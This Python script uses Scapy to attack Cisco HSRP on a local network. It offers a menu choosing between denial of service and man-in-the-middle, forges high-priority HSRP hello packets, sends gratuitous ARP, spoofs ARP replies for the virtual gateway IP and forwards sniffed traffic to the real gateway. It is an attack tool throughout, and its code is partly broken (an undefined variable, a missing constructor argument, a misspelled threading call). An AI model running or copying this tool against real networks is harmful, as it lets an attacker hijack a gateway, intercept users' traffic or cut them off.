from scapy.all import *
import threading
import time

class Attack:
    def __init__(self, type, iface, srcIP, srcHW, group, priority, vIP, verbose, gwIP):
        self.type = type
        self.iface = iface
        self.srcIP = srcIP
        self.srcHW = srcHW
        self.group = group
        self.priority = priority
        self.vIP = vIP
        self.verbose = verbose
        # TO TEST: See if can find gw ip and gw mac
        self.gwIP = gwIP 
        self.gwMAC = getmacbyip(gwIP)

    def show(self):
        print(f"Attack options: \niface = {self.iface} \nsrcIP = {self.srcIP} \nsrcHW  {self.srcHW} \ngroup = {self.group} \npriority = {self.priority} \nvIP = {self.vIP} \nVerbose = {self.verbose}")
    
    def send_garp(self):
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp = ARP(psrc=self.vIP, pdst=self.vIP, hwsrc=self.srcHW)
        toSend = ether/arp
        if (self.verbose == 1):
            toSend.show()
        sendp(toSend, iface=self.iface)
    
    def hsrp_hack(self):
        ether = Ether(src=self.srcHW, dst="01:00:5e:00:00:02")
        ip = IP(src=self.srcIP, dst='224.0.0.2')
        udp = UDP(sport=1985,dport=1985)
        hsrp = HSRP(group=self.group, priority=self.priority, virtualIP=self.vIP)
        toSend = ether/ip/udp/hsrp
        if (self.verbose == 1):
            toSend.show()
        send(toSend, iface=self.iface)
        self.send_garp()
        send(toSend, iface=self.iface, inter=3, loop=1)

    def arp_responder(self,packet):
        if (packet[ARP].op == 1 and packet.pdst == "192.168.1.254"):
            replyARP = ARP(op=2, hwsrc=self.srcHW, psrc=packet.pdst, hwdst=packet[Ether].src, pdst=packet.psrc)
            reply = Ether(dst=packet[Ether].src, src=self.srcHW) / replyARP
            if(self.verbose == 1):
                reply.show()
            sendp(reply)
        return

    def traffic_forwarder(self,packet):
        toSend = pkt[0]
        toSend[Ether].dst = self.gwMAC
        toSend.show()
        sendp(toSend, iface=self.iface)
        return

    def arp_request_sniffer(self):
        while True:
            sniff(iface = self.iface, count = 1, filter = "arp", prn = self.arp_responder)
    
    def traffic_sniffer(self):
        while True:
            sniff(iface = self.iface, count = 1, filter = "(tcp or ip or udp or icmp) and not src port 1985 and not broadcast", prn = self.traffic_forwarder)


def choose_attack():
    while (True):
        attack_choice = input("Hi, please enter type of attack to perform: \n1. HSRP DOS attack \n2. HSRP MiTM attack\n")
        att_choice = convert_to_int(attack_choice)
        if(isinstance(att_choice,int) and att_choice == 1):
            print("HSRP DOS attack chosen.")
            return 1
        elif(att_choice == 2):
            print("HSRP MiTM attack chosen.")
            return 2

def choose_inter():
    while (True):
        print("Please input interface to attack on:")
        interfaces = get_if_list()
        no_of_int= len(interfaces)
        if(no_of_int > 0):
            for i in range(1,no_of_int+1):
                print(i,": ", interfaces[i-1])
            int_choice  = input()
            int_choice = convert_to_int(int_choice)
            if(no_of_int >= int_choice and int_choice > 0):
                print("test")
                iface_choice = interfaces[int_choice-1]
                return iface_choice
        else:
            print("No interfaces deteced. Please check interfaces.")
            exit()

def convert_to_int(string):
    try:
        string = int(string)
        return string
    except:
        return 10

def menu():
    while(True):
        att_choice = choose_attack()
        print("Sniffing HSRP packet to get configurations...")
        hsrp_pkt = sniff(filter="udp and src port 1985")
        #TODO: please test and use the information from the HSRP packet sniffed
        print("Sniffing complete, Please enter configurations below (enter for default value): ")
        iface = choose_inter()
        srcIP = input("Source IP ("+ get_if_addr(iface)+"): ")
        srcHW = input("Source HW (00:00:0c:07:ac:01): ")
        group = input("HSRP Group (1): ")
        priority = input("HSRP Priority (250): ")
        vIP = input("HSRP Virtual IP (192.168.1.254): ")
        verbose = input("Verbose? (1): ")
        gwIP = input("Gateway IP: ")
        if(srcIP == ""):
            srcIP = get_if_addr(iface)
        if(srcHW == ""):
            srcHW = get_if_hwaddr(iface)
        if(group== ""):
            group = 1
        if(priority == ""):
            priority = 200
        if(vIP== ""):
            vIP = "192.168.1.254"
        if(verbose == ""):
            verbose = 1
        if(gwIP == ""):
            continue

        print(f"Options: \niface = {iface} \nsrcIP = {srcIP} \nsrcHW  {srcHW} \nroup = {group} \npriority = {priority} \nvIP = {vIP} \nVerbose = {verbose}\n gwIP = {gwIP}")
        confirm = input("Confirm? ==> (1) ")
        if(convert_to_int(confirm) == 1 or confirm == ""):
            return Attack(att_choice,iface,srcIP,srcHW,group,priority,vIP, gwIP)

if __name__  == "__main__":
    attack = menu()
    arp_sniff = threading.Thread(target=attack.arp_request_sniffer)
    traffic_sniff = threading.Thread(target=attack.traffic_sniffer)
    hsrp_hack_t = threadingThread(target=attack.hsrp_hack)
    arp_sniff.start()
    print("ARP responder started")
    traffic_sniff.start()
    print("Traffic sniffer started")
    hsrp_hack_t.start()
    print("HSRP hack started")